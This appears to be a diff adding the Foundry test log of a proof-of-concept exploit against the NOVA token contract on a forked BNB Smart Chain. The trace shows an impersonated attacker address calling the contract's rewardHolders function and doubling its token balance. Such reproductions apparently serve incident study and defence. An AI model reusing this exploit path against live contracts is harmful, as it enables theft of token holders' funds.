@@ -1,0 +1,33 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/NovaExchange_exp.sol:ContractTest
+[PASS] testExploit() (gas: 34702)
+Logs:
+  Before exploit, NOVA balance of attacker:: 10000000000020000000000000000
+  After exploit,  NOVA balance of attacker:: 20000000000020000000000000000
+
+Traces:
+  [5830] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("bsc", 23749678 [2.374e7])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [34702] ContractTest::testExploit()
+    ├─ [2886] 0xB5B27564D05Db32CF4F25813D35b6E6de9210941::balanceOf(0xCBF184b8156e1271449CFb42A7D0556A8DCFEf72) [staticcall]
+    │   └─ ← [Return] 10000000000020000000000000000 [1e28]
+    ├─ emit log_named_uint(key: "Before exploit, NOVA balance of attacker:", val: 10000000000020000000000000000 [1e28])
+    ├─ [0] VM::prank(0xCBF184b8156e1271449CFb42A7D0556A8DCFEf72)
+    │   └─ ← [Return]
+    ├─ [11399] 0xB5B27564D05Db32CF4F25813D35b6E6de9210941::rewardHolders(10000000000000000000000000000 [1e28])
+    │   ├─  storage changes:
+    │   │   @ 0x43bb294d1120e845f948727c25a5f9f8e57439d4c6cce15b5dbb9b8f2916451a: 0x0000000000000000000000000000000000000000204fce5e3e6c1045ef820000 → 0x0000000000000000000000000000000000000000409f9cbc7c9112a6ff820000
+    │   │   @ 10: 0x0000000000000000000000000000000000000000204fce5e3f8847d96d8a0000 → 0x0000000000000000000000000000000000000000409f9cbc7dad4a3a7d8a0000
+    │   └─ ← [Stop]
+    ├─ [886] 0xB5B27564D05Db32CF4F25813D35b6E6de9210941::balanceOf(0xCBF184b8156e1271449CFb42A7D0556A8DCFEf72) [staticcall]
+    │   └─ ← [Return] 20000000000020000000000000000 [2e28]
+    ├─ emit log_named_uint(key: "After exploit,  NOVA balance of attacker:", val: 20000000000020000000000000000 [2e28])
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 631.24ms (468.50µs CPU time)
+
+Ran 1 test suite in 1.18s (631.24ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
